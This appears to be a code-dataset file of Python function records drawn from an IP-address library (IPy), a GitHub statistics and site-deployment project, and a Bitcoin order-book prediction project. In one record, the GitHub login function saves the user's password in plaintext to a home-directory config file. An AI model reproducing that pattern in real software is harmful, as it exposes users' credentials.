{"docstring": "# The algorithm below *depends* on the sort order\n", "func_signal": "def optimize(self):\n", "code": "self.prefixes.sort()\n\n# First eliminate all values that are a subset of other values\naddrlen = len(self.prefixes)\ni = 0\nwhile i < addrlen:\n    # Everything that might be inside this prefix follows\n    # directly behind it\n    j = i+1\n    while j < addrlen and self.prefixes[j] in self.prefixes[i]:\n        # Mark for deletion by overwriting with None\n        self.prefixes[j] = None\n        j += 1\n    \n    # Continue where we left off\n    i = j\n    \n# Try to merge as many prefixes as possible\nrun_again = True\nwhile run_again:\n    # Filter None values. This happens when a subset is eliminated\n    # above, or when two prefixes are merged below\n    self.prefixes = [a for a in self.prefixes if a is not None]\n\n    # We'll set run_again to True when we make changes that require\n    # re-evaluation of the whole list\n    run_again = False\n\n    # We can merge two prefixes that have the same version, same\n    # prefix length and differ only on the last bit of the prefix\n    addrlen = len(self.prefixes)\n    i = 0\n    while i < addrlen-1:\n        j = i + 1\n        \n        try:\n            # The next line will throw an exception when merging\n            # is not possible\n            self.prefixes[i] += self.prefixes[j]\n            self.prefixes[j] = None\n            i = j + 1\n            run_again = True\n        except ValueError:\n            # Can't be merged, see if position j can be merged\n            i = j\n\n# O(n) insertion now by prefix means faster searching on __contains__\n# when lots of ranges with the same length exist\nself.prefixtable = {}\nfor address in self.prefixes:\n    try:\n        self.prefixtable[address._prefixlen].append(address)\n    except KeyError:\n        self.prefixtable[address._prefixlen] = [address]", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Return a string representation in the usual format.\n\n>>> print(IP('127.0.0.1').strNormal())\n127.0.0.1\n>>> print(IP('2001:0658:022a:cafe:0200::1').strNormal())\n2001:658:22a:cafe:200:0:0:1\n\"\"\"\n\n", "func_signal": "def strNormal(self, wantprefixlen = None):\n", "code": "if self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 1\n\nif self._ipversion == 4:\n    ret = self.strFullsize(0)\nelif self._ipversion == 6:\n    ret = ':'.join([\"%x\" % x for x in [int(x, 16) for x in self.strFullsize(0).split(':')]])\nelse:\n    raise ValueError(\"only IPv4 and IPv6 supported\")\n\n\n\nreturn ret + self._printPrefix(wantprefixlen)", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Convert an Integer representing a netmask to a prefixlen.\n\nE.g. 0xffffff00 (255.255.255.0) returns 24\n\"\"\"\n\n", "func_signal": "def _netmaskToPrefixlen(netmask):\n", "code": "netlen = _count0Bits(netmask)\nmasklen = _count1Bits(netmask)\n_checkNetmask(netmask, masklen)\nreturn masklen - netlen", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Check if a base addess of a network is compatible with a prefixlen\"\"\"\n", "func_signal": "def _checkNetaddrWorksWithPrefixlen(net, prefixlen, version):\n", "code": "try:\n    return (net & _prefixlenToNetmask(prefixlen, version) == net)\nexcept ValueError:\n    return False", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Return netmask as an string. Mostly useful for IPv6.\n\n>>> print(IP('195.185.0.0/16').strNetmask())\n255.255.0.0\n>>> print(IP('2001:0658:022a:cafe::0/64').strNetmask())\n/64\n\"\"\"\n\n# TODO: unify with prefixlenToNetmask?\n# Note: call to _ipVersionToLen() also validates version is 4 or 6\n", "func_signal": "def strNetmask(self):\n", "code": "bits = _ipVersionToLen(self._ipversion)\nif self._ipversion == 4:\n    locallen = bits - self._prefixlen\n    return intToIp(((2 ** self._prefixlen) - 1) << locallen, 4)\nelif self._ipversion == 6:\n    return \"/%d\" % self._prefixlen", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Called to implement evaluation of self[key].\n\n>>> ip=IP('127.0.0.0/30')\n>>> for x in ip:\n...  print(repr(x))\n...\nIP('127.0.0.0')\nIP('127.0.0.1')\nIP('127.0.0.2')\nIP('127.0.0.3')\n>>> ip[2]\nIP('127.0.0.2')\n>>> ip[-1]\nIP('127.0.0.3')\n\"\"\"\n\n", "func_signal": "def __getitem__(self, key):\n", "code": "if isinstance(key, slice):\n    return [self.ip + int(x) for x in xrange(*key.indices(len(self)))]\nif not isinstance(key, INT_TYPES):\n    raise TypeError\nif key < 0:\n    if abs(key) <= self.len():\n        key = self.len() - abs(key)\n    else:\n        raise IndexError\nelse:\n    if key >= self.len():\n        raise IndexError\n\nreturn self.ip + int(key)", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Called for the key object for dictionary operations, and by\nthe built-in function hash(). Should return a 32-bit integer\nusable as a hash value for dictionary operations. The only\nrequired property is that objects which compare equal have the\nsame hash value\n\n>>> IP('10.0.0.0/24').__hash__()\n-167772185\n\"\"\"\n\n", "func_signal": "def __hash__(self):\n", "code": "thehash = int(-1)\nip = self.ip\nwhile ip > 0:\n    thehash = thehash ^ (ip & 0x7fffffff)\n    ip = ip >> 32\nthehash = thehash ^ self._prefixlen\nreturn int(thehash)", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Transform an integer string into an IP address.\"\"\"\n\n# just to be sure and hoping for Python 2.2\n", "func_signal": "def intToIp(ip, version):\n", "code": "ip = int(ip)\n\nif ip < 0:\n    raise ValueError(\"IPs can't be negative: %d\" % (ip))\n\nret = ''\nif version == 4:\n    if ip > MAX_IPV4_ADDRESS:\n        raise ValueError(\"IPv4 Address can't be larger than %x: %x\" % (MAX_IPV4_ADDRESS, ip))\n    for l in xrange(4):\n        ret = str(ip & 0xff) + '.' + ret\n        ip = ip >> 8\n    ret = ret[:-1]\nelif version == 6:\n    if ip > MAX_IPV6_ADDRESS:\n        raise ValueError(\"IPv6 Address can't be larger than %x: %x\" % (MAX_IPV6_ADDRESS, ip))\n    l = \"%032x\" % ip\n    for x in xrange(1, 33):\n        ret = l[-x] + ret\n        if x % 4 == 0:\n            ret = ':' + ret\n    ret = ret[1:]\nelse:\n    raise ValueError(\"only IPv4 and IPv6 supported\")\n\nreturn ret", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Return netmask as an integer.\n\n>>> \"%X\" % IP('195.185.0.0/16').netmask().int()\n'FFFF0000'\n\"\"\"\n\n# TODO: unify with prefixlenToNetmask?\n", "func_signal": "def netmask(self):\n", "code": "bits = _ipVersionToLen(self._ipversion)\nlocallen = bits - self._prefixlen\n\nreturn ((2 ** self._prefixlen) - 1) << locallen", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Emulate numeric objects through network aggregation\"\"\"\n", "func_signal": "def __add__(self, other):\n", "code": "if self._ipversion != other._ipversion:\n    raise ValueError(\"Only networks with the same IP version can be added.\")\nif self._prefixlen != other._prefixlen:\n    raise ValueError(\"Only networks with the same prefixlen can be added.\")\nif self._prefixlen < 1:\n    raise ValueError(\"Networks with a prefixlen longer than /1 can't be added.\")\nif self > other:\n    # fixed by Skinny Puppy <skin_pup-IPy@happypoo.com>\n    return other.__add__(self)\nif other.int() - self[-1].int() != 1:\n    raise ValueError(\"Only adjacent networks can be added together.\")\nret = IP(self.int(), ipversion=self._ipversion)\nret._prefixlen = self.prefixlen() - 1\nif not _checkNetaddrWorksWithPrefixlen(ret.ip, ret._prefixlen,\n                                       ret._ipversion):\n    raise ValueError(\"The resulting %s has invalid prefix length (%s)\"\n                     % (repr(ret), ret._prefixlen))\nreturn ret", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Return a string representation as a binary value.\n\n>>> print(IP('127.0.0.1').strBin())\n01111111000000000000000000000001\n>>> print(IP('2001:0658:022a:cafe:0200::1').strBin())\n00100000000000010000011001011000000000100010101011001010111111100000001000000000000000000000000000000000000000000000000000000001\n\"\"\"\n\n", "func_signal": "def strBin(self, wantprefixlen = None):\n", "code": "bits = _ipVersionToLen(self._ipversion)\nif self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 0\nret = _intToBin(self.ip)\nreturn  '0' * (bits - len(ret)) + ret + self._printPrefix(wantprefixlen)", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Return a string representation in the non-mangled format.\n\n>>> print(IP('127.0.0.1').strFullsize())\n127.0.0.1\n>>> print(IP('2001:0658:022a:cafe:0200::1').strFullsize())\n2001:0658:022a:cafe:0200:0000:0000:0001\n\"\"\"\n\n", "func_signal": "def strFullsize(self, wantprefixlen = None):\n", "code": "if self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 1\n\nreturn intToIp(self.ip, self._ipversion) + self._printPrefix(wantprefixlen)", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Return a list with values forming the reverse lookup.\n\n>>> IP('213.221.113.87/32').reverseNames()\n['87.113.221.213.in-addr.arpa.']\n>>> IP('213.221.112.224/30').reverseNames()\n['224.112.221.213.in-addr.arpa.', '225.112.221.213.in-addr.arpa.', '226.112.221.213.in-addr.arpa.', '227.112.221.213.in-addr.arpa.']\n>>> IP('127.0.0.0/24').reverseNames()\n['0.0.127.in-addr.arpa.']\n>>> IP('127.0.0.0/23').reverseNames()\n['0.0.127.in-addr.arpa.', '1.0.127.in-addr.arpa.']\n>>> IP('127.0.0.0/16').reverseNames()\n['0.127.in-addr.arpa.']\n>>> IP('127.0.0.0/15').reverseNames()\n['0.127.in-addr.arpa.', '1.127.in-addr.arpa.']\n>>> IP('128.0.0.0/8').reverseNames()\n['128.in-addr.arpa.']\n>>> IP('128.0.0.0/7').reverseNames()\n['128.in-addr.arpa.', '129.in-addr.arpa.']\n>>> IP('::1:2').reverseNames()\n['2.0.0.0.1.ip6.arpa.']\n\"\"\"\n\n", "func_signal": "def reverseNames(self):\n", "code": "if self._ipversion == 4:\n    ret = []\n    # TODO: Refactor. Add support for IPint objects\n    if self.len() < 2**8:\n        for x in self:\n            ret.append(x.reverseName())\n    elif self.len() < 2**16:\n        for i in xrange(0, self.len(), 2**8):\n            ret.append(self[i].reverseName()[2:])\n    elif self.len() < 2**24:\n        for i in xrange(0, self.len(), 2**16):\n            ret.append(self[i].reverseName()[4:])\n    else:\n        for i in xrange(0, self.len(), 2**24):\n            ret.append(self[i].reverseName()[6:])\n    return ret\nelif self._ipversion == 6:\n    ipv4 = self._getIPv4Map()\n    if ipv4 is not None:\n        return ipv4.reverseNames()\n    s = \"%x\" % self.ip\n    if self._prefixlen % 4 != 0:\n        raise NotImplementedError(\"can't create IPv6 reverse names at sub nibble level\")\n    s = list(s)\n    s.reverse()\n    s = '.'.join(s)\n    first_nibble_index = int(32 - (self._prefixlen // 4)) * 2\n    return [\"%s.ip6.arpa.\" % s[first_nibble_index:]]\nelse:\n    raise ValueError(\"only IPv4 and IPv6 supported\")", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Checks if a netmask is expressable as a prefixlen.\"\"\"\n\n", "func_signal": "def _checkNetmask(netmask, masklen):\n", "code": "num = int(netmask)\nbits = masklen\n\n# remove zero bits at the end\nwhile (num & 1) == 0 and bits != 0:\n    num = num >> 1\n    bits -= 1\n    if bits == 0:\n        break\n# now check if the rest consists only of ones\nwhile bits > 0:\n    if (num & 1) == 0:\n        raise ValueError(\"Netmask 0x%x can't be expressed as an prefix.\" % netmask)\n    num = num >> 1\n    bits -= 1", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Updates the GitHub stats.\n\nGenerates the index, stats per language, and overall stats.\n\n:type use_user_cache: boolean\n:param use_user_cache: Determines whether to use the existing user\n    cache if it exists, or if the GitHub API should be called instead.\n\"\"\"\n", "func_signal": "def update_stats(self, use_user_cache=True):\n", "code": "if use_user_cache:\n    self.load_caches()\nclick.echo('Printing index...')\nself.output_index()\nfor language in self.languages:\n    if language != 'Overall':\n        click.echo('Generating stats for ' + language + '...')\n        self.generate_language_stats(language)\n        self.print_rate_limit()\n        self.sleep_for_rate_limiter(self.CFG_SLEEP_TIME)\nif 'Overall' in self.languages:\n    click.echo('Generating overall stats...')\n    self.generate_overall_stats()\nself.print_rate_limit()\nself.write_output_files()", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Updates the GitHub user location string with a geocoded location.\n\nTODO: This is a work-in-progress!\n\n:type use_user_cache: boolean\n:param use_user_cache: Determines whether to use the existing user\n    cache if it exists, or if the GitHub API should be called instead.\n\"\"\"\n", "func_signal": "def update_user_locations(self, use_user_cache=True):\n", "code": "if use_user_cache:\n    self.load_caches()\nuser_geocoder = UserGeocoder(self.cached_users, self.user_geocodes_map)\ncsv_path = self.build_module_path('data/2017/user-geocodes-dump.csv')\nuser_geocoder.generate_user_geocodes(csv_path,\n                                     self.CFG_USERS_GEOCODES_PATH)", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Publish to Rackspace Cloud Files\"\"\"\n", "func_signal": "def cf_upload():\n", "code": "rebuild()\nwith lcd(DEPLOY_PATH):\n    local('swift -v -A https://auth.api.rackspacecloud.com/v1.0 '\n          '-U {cloudfiles_username} '\n          '-K {cloudfiles_api_key} '\n          'upload -c {cloudfiles_container} .'.format(**env))", "path": "site\\fabfile.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Remove generated files\"\"\"\n", "func_signal": "def clean():\n", "code": "if os.path.isdir(DEPLOY_PATH):\n    shutil.rmtree(DEPLOY_PATH)\n    os.makedirs(DEPLOY_PATH)", "path": "site\\fabfile.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Writes the repos csv.\n\nTODO: Refactor to use the built-in module `csv`.\n\n:type data_file_name: str\n:param data_file_name: The resulting csv file name in the data folder.\n    Example: 'data/2017/foo.csv'.\n\"\"\"\n", "func_signal": "def write_csv_repos(self, data_file_name):\n", "code": "file_path = self.build_module_path(data_file_name)\nwith open(file_path, 'w') as repos_dat:\n    repos_dat.write('full_name, stars, forks, description, language\\n')\n    for repo in self.overall_repos:\n        language = repo.language if repo.language is not None else ''\n        desc = repo.description if repo.description is not None else ''\n        desc = desc.replace('\"', \"'\")\n        repos_dat.write(\n            repo.full_name + ', ' +\n            str(repo.stars) + ', ' +\n            str(repo.forks) + ', ' + '\"' +\n            desc + '\", ' +\n            language + '\\n')", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Logs into GitHub.\n\nAdapted from https://github.com/sigmavirus24/github-cli.\n\nTODO: Two factor authentication does not seem to be triggering the\n    SMS code: https://github.com/sigmavirus24/github3.py/issues/387\n\nArgs:\n    * None.\n\nReturns:\n    None.\n\"\"\"\n# Get the full path to the configuration file\n", "func_signal": "def _login(self):\n", "code": "config = self._github_config(self.CONFIG)\nparser = configparser.RawConfigParser()\n# Check to make sure the file exists and we are allowed to read it\nif os.path.isfile(config) and os.access(config, os.R_OK | os.W_OK):\n    parser.readfp(open(config))\n    self.user_login = parser.get(self.CONFIG_SECTION,\n                                 self.CONFIG_USER_LOGIN)\n    self.api = login(token=parser.get(self.CONFIG_SECTION,\n                                      self.CONFIG_USER_TOKEN),\n                     two_factor_callback=self._two_factor_code)\nelse:\n    # Either the file didn't exist or we didn't have the correct\n    # permissions\n    user_login = ''\n    while not user_login:\n        user_login = input('User Login: ')\n    user_pass = ''\n    while not user_pass:\n        user_pass = getpass('Password: ')\n    auth = None\n    try:\n        # Get an authorization for this\n        auth = authorize(\n            user_login,\n            user_pass,\n            scopes=['user', 'repo', 'gist'],\n            note='githubcli',\n            note_url='https://github.com/donnemartin/github-cli'\n        )\n    except UnprocessableEntity:\n        click.secho('Error creating token.\\nVisit the following '\n                    'page and verify you do not have an existing '\n                    'token named \"githubcli\":\\n'\n                    'See https://github.com/settings/tokens\\n'\n                    'If a token already exists update your ' +\n                    self.githubconfig + ' file with your user_token.',\n                    fg='red')\n    parser.add_section(self.CONFIG_SECTION)\n    parser.set(self.CONFIG_SECTION, self.CONFIG_USER_LOGIN, user_login)\n    parser.set(self.CONFIG_SECTION, self.CONFIG_USER_PASS, user_pass)\n    parser.set(self.CONFIG_SECTION, self.CONFIG_USER_TOKEN, auth.token)\n    self.api = login(token=auth.token,\n                     two_factor_callback=self._two_factor_code)\n    # Create the file if it doesn't exist. Otherwise completely blank\n    # out what was there before. Kind of dangerous and destructive but\n    # somewhat necessary\n    parser.write(open(config, 'w+'))", "path": "githubstats\\lib\\github.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Groups repos in the given list by users.\n\nExample input:\n    users[0] -> User(Google, 1000)\n    users[1] -> User(Facebook, 2000)\n    users[2] -> User(Google, 3000)\n    users[3] -> User(Facebook, 4000)\n\nExample result:\n    result[0] -> User(Facebook, 6000)\n    result[1] -> User(Google, 4000)\n\n:type users: list\n:param users: A list of :class:`githubstats.user.User`.\n\n:rtype: list\n:return: A grouped sorted list of :class:`githubstats.user.User`.\n\"\"\"\n", "func_signal": "def group_repos_by_user(self, users):\n", "code": "user_stars_map = {}\nfor item in users:\n    if item.id in user_stars_map:\n        user_stars_map[item.id].stars += item.stars\n    else:\n        user_stars_map[item.id] = User(item.id,\n                                       item.name,\n                                       item.type,\n                                       item.location,\n                                       item.stars)\nresult_list_sorted = sorted(user_stars_map.items(),\n                            key=itemgetter(1),\n                            reverse=True)\nresult = self.extract_list_column(result_list_sorted, column=1)\nreturn result", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Publish to GitHub Pages\"\"\"\n", "func_signal": "def gh_pages():\n", "code": "rebuild()\nlocal(\"ghp-import -b {github_pages_branch} {deploy_path}\".format(**env))\nlocal(\"git push origin {github_pages_branch}\".format(**env))", "path": "site\\fabfile.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Publish to production via rsync\"\"\"\n", "func_signal": "def publish():\n", "code": "local('pelican -s publishconf.py')\nproject.rsync_project(\n    remote_dir=dest_path,\n    exclude=\".DS_Store\",\n    local_dir=DEPLOY_PATH.rstrip('/') + '/',\n    delete=True,\n    extra_opts='-c',\n)", "path": "site\\fabfile.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"`build`, then `serve`\"\"\"\n", "func_signal": "def reserve():\n", "code": "build()\nserve()", "path": "site\\fabfile.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Loads the specified cached data.\n\n:type cache_path: str\n:param cache_path: The cache path.\n\n:rtype: dict\n:return: The cache data if exists, else an empty dict.\n\"\"\"\n", "func_signal": "def load_cache(self, cache_path):\n", "code": "try:\n    click.echo('Loading: ' + cache_path)\n    with open(cache_path, 'rb') as data:\n        return pickle.load(data)\nexcept (EOFError, FileNotFoundError):\n    click.secho('Failed to load cache ' + cache_path, fg='red')\nreturn {}", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"From: https://www.andreas-jung.com/contents/a-python-decorator-for-measuring-the-execution-time-of-methods  # NOQA\n\"\"\"\n", "func_signal": "def timeit(method):\n", "code": "def timed(*args, **kw):\n    ts = time.time()\n    result = method(*args, **kw)\n    te = time.time()\n    message = '%r (%r, %r) %2.2f sec' % (method.__name__, args, kw, te-ts)\n    click.secho(message + '\\n', fg='red')\n    return result\nreturn timed", "path": "githubstats\\lib\\debug_timer.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Extracts the specified column in the input_list.\n\nExample:\n    input_list = [['a', 'b'], ['c', 'd']]\n    extract_list_column(input_list, 1) -> ['a', 'c']\n\nTODO: This would probably be faster with NumPy.\n\n:type input_list: list\n:param input_list: The input list to extract a column from.\n\n:type column: int\n:param column: The column index to extract.\n\n:rtype: list\n:return: The specified column.\n\"\"\"\n", "func_signal": "def extract_list_column(self, input_list, column):\n", "code": "result = []\nfor item in input_list:\n    result.append(item[column])\nreturn result", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Generates geocodes for the user's provided location.\n\n:type csv_path: str\n:param csv_path: The user geocodes CSV path to update.\n\n:type cache_path: str\n:param cache_path: The user geocodes cache path to update.\n\"\"\"\n", "func_signal": "def generate_user_geocodes(self, csv_path, cache_path):\n", "code": "count = 0\nfor user_id, user in self.cached_users.items():\n    if count >= self.CFG_MAX_GEOCODES:\n        break\n    if user_id in self.user_geocodes_map:\n        continue\n    if user.location is not None:\n        count += 1\n        geocode = geocoder.google(user.location)\n        click.echo('geocoder status: {0} {1} '.format(str(count),\n                                                      geocode.status))\n        if geocode.status == 'OVER_QUERY_LIMIT':\n            click.secho('Geocode rate limit exceeded!', fg='red')\n            break\n        self.user_geocodes_map[user_id] = geocode\n    else:\n        self.user_geocodes_map[user_id] = ''\nself.write_csv_users_geocodes(csv_path)\nself.save_user_geocodes_cache(cache_path)\nself.print_num_users_missing_geocodes()", "path": "githubstats\\user_geocoder.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Generates the stats for the specified language.\n\nOutputs the following lists, sorted by stars:\n    * Users\n    * Orgs\n    * Repos\n\nAlso updates the overall stats.\n\n:type language: str\n:param language: The current language.\n\"\"\"\n", "func_signal": "def generate_language_stats(self, language):\n", "code": "user_id_to_users_map, repos = self.count_stars(language)\nsorted_user_id_to_users = sorted(user_id_to_users_map.items(),\n                                 key=itemgetter(1),\n                                 reverse=True)\n# [('user_id0', User0), ('user_id1', User1] -> [User0, User1]\nsorted_users = self.extract_list_column(sorted_user_id_to_users,\n                                        column=1)\n# Split up sorted_users, which contains both users and orgs\ndevs, orgs = self.get_user_info(sorted_users)\nself.output_sorted_stars_per_repo(language, repos, sort=True)\nself.output_sorted_stars_per_user(language, devs)\nself.output_sorted_stars_per_org(language, orgs)\nself.overall_repos.extend(repos)\nself.overall_devs.extend(devs)\nself.overall_orgs.extend(orgs)", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Gets user info from the GitHubAPI.\n\nFor each user in sorted_users, determines whether the user is\na regular user or an organization.\n\n:type sorted_users: list\n:param sorted_users: Sorted list of users.\n\n:rtype: tuple of two lists\n:return: (first list, second list)\n    First list: list of [:class:`githubstats.user.User`]\n    Second list: list of [:class:`githubstats.repo.Repo`]\n\"\"\"\n", "func_signal": "def get_user_info(self, sorted_users):\n", "code": "devs = []\norgs = []\nself.print_rate_limit()\nfor item in sorted_users:\n    if item.id in self.cached_users:\n        user = self.cached_users[item.id]\n    else:\n        user = self.github.api.user(item.id)\n    if user.type == 'User':\n        devs.append(User(item.id,\n                         user.name,\n                         user.type,\n                         user.location,\n                         item.stars))\n    elif user.type == 'Organization':\n        orgs.append(User(item.id,\n                         user.name,\n                         user.type,\n                         user.location,\n                         item.stars))\n    self.print_rate_limit()\nreturn devs, orgs", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Writes the repos and users csvs.\"\"\"\n", "func_signal": "def write_csvs(self):\n", "code": "self.write_csv_repos('data/2017/repos-dump.csv')\nself.write_csv_users('data/2017/users-dump.csv')", "path": "githubstats\\github_stats.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"`clean` then `build`\"\"\"\n", "func_signal": "def rebuild():\n", "code": "clean()\nbuild()", "path": "site\\fabfile.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Attempts to find the github config file.\n\nAdapted from https://github.com/sigmavirus24/github-cli.\n\nArgs:\n    * config_file_name: A String that represents the config file name.\n\nReturns:\n    A string that represents the github config file path.\n\"\"\"\n", "func_signal": "def _github_config(self, config_file_name):\n", "code": "home = os.path.abspath(os.environ.get('HOME', ''))\nconfig_file_path = os.path.join(home, config_file_name)\nreturn config_file_path", "path": "githubstats\\lib\\github.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "\"\"\"Inits GitHub.\n\nArgs:\n    * None.\n\nReturns:\n    None.\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.api = None\nself.user_login = None\nself.user_pass = None\nself.user_token = None\nself._login()", "path": "githubstats\\lib\\github.py", "repo_name": "donnemartin/viz", "stars": 775, "license": "other", "language": "python", "size": 76787}
{"docstring": "'''\nReturns the percent change of a volume-weighted average of trades for each\ndata point in DataFrame of book data\n'''\n\n", "func_signal": "def get_trades_average(books, trades):\n", "code": "def mean_trades(x):\n    trades_n = trades.iloc[x.indexes[0]:x.indexes[1]]\n    if not trades_n.empty:\n        return (trades_n.price*trades_n.amount).sum()/trades_n.amount.sum()\nreturn (books.mid/books.apply(mean_trades, axis=1)).apply(log).fillna(0)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns a measure of the imbalance between bids and offers for each data\npoint in DataFrame of book data\n'''\n\n", "func_signal": "def get_power_imbalance(books, n=10, power=2):\n", "code": "def calc_imbalance(book):\n    def calc(x):\n        return x.amount*(.5*book.width/(x.price-book.mid))**power\n    bid_imbalance = book.bids.iloc[:n].apply(calc, axis=1)\n    ask_imbalance = book.asks.iloc[:n].apply(calc, axis=1)\n    return (bid_imbalance-ask_imbalance).sum()\nimbalance = books.apply(calc_imbalance, axis=1)\nreturn imbalance", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nConvenience function for calling make_features\n'''\n", "func_signal": "def make_data(symbol, sample):\n", "code": "data = make_features(symbol,\n                     sample=sample,\n                     mid_offsets=[30],\n                     trades_offsets=[30, 60, 120, 180],\n                     powers=[2, 4, 8])\nreturn data", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nGets json from the API\n'''\n", "func_signal": "def get_json(url):\n", "code": "resp = urllib2.urlopen(url)\nreturn json.load(resp, object_hook=format_book_entry), resp.getcode()", "path": "collect-data\\collect_books.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns list of differences between collection time and max book timestamps\nfor verification purposes\n'''\n", "func_signal": "def check_times(books):\n", "code": "time_diff = []\nfor i in range(len(books)):\n    book = books.iloc[i]\n    ask_ts = max(book.asks.timestamp)\n    bid_ts = max(book.bids.timestamp)\n    ts = max(ask_ts, bid_ts)\n    time_diff.append(book.name-ts)\nreturn time_diff", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns the linear trend in previous trades for each data point in DataFrame\nof book data\n'''\n\n", "func_signal": "def get_trend(books, trades):\n", "code": "def trend(x):\n    trades_n = trades.iloc[x.indexes[0]:x.indexes[1]]\n    if len(trades_n) < 3:\n        return 0\n    else:\n        return linregress(trades_n.index.values, trades_n.price.values)[0]\nreturn books.apply(trend, axis=1)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nConverts book data to float\n'''\n", "func_signal": "def format_book_entry(entry):\n", "code": "if all(key in entry for key in ('amount', 'price', 'timestamp')):\n    entry['amount'] = float(entry['amount'])\n    entry['price'] = float(entry['price'])\n    entry['timestamp'] = float(entry['timestamp'])\nreturn entry", "path": "collect-data\\collect_books.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nAppend df2 to df1\n'''\n", "func_signal": "def append_data(df1, df2):\n", "code": "df = pd.concat((df1, df2))\nreturn df.groupby(df.index).first()", "path": "model\\model.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
